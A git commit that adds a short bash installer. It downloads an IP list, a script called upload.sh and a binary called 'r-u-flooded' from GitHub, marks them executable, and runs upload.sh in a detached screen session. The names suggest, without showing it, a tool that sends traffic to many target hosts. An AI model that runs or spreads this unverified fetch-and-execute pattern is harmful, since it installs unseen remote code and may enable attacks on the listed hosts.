2c2cbbce6a115a5a044db55b95cb4bd2d8b0a3be
varathongue <116969729+varathongue@users.noreply.github.com>
2022-12-24 15:36:42 +0100

    Create install.sh
    initial commit for install sh.

---
+++ install.sh
@@ -0,0 +1,33 @@
+#!/usr/bin/env bash
+
+update_list(){
+	if curl -LJ https://raw.githubusercontent.com/varathongue/upload/main/list-ip.txt -o new-ip-list.txt; then
+		mv new-ip-list.txt ip-list.txt
+	else
+		echo "couldn't download ip list"
+	fi
+}
+
+if [[ ! -f 'upload.sh' ]]; then
+	curl -OLJ https://raw.githubusercontent.com/varathongue/upload/main/upload.sh
+	chmod +x upload.sh
+fi
+
+if [[ ! -f 'r-u-flooded' ]]; then
+	curl -OLJ https://github.com/c3l3si4n/r-u-flooded/releases/download/v0.1.1/r-u-flooded
+	chmod +x r-u-flooded
+fi
+
+if [[ ! -f 'ip-list.txt' ]]; then
+	update_list
+fi
+
+
+case "$1" in
+   'run')
+      screen -d -S upload -m ./upload.sh
+      ;;
+   'update')
+      update_list
+      ;;
+esac
